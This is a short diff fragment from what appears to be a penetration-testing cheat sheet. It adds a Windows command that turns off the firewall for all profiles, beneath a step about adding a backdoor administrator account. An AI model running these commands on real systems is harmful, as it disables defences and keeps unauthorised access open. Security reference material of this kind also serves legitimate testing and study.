@@ -194,6 +194,10 @@ Add backdoor account as admin user:
 
 	Confirm that it has been added: net locagroup administrators
 
+Disable firewall:
+
+	netsh advfirewall set allprofiles state off
+
 
 ## Payloads
 
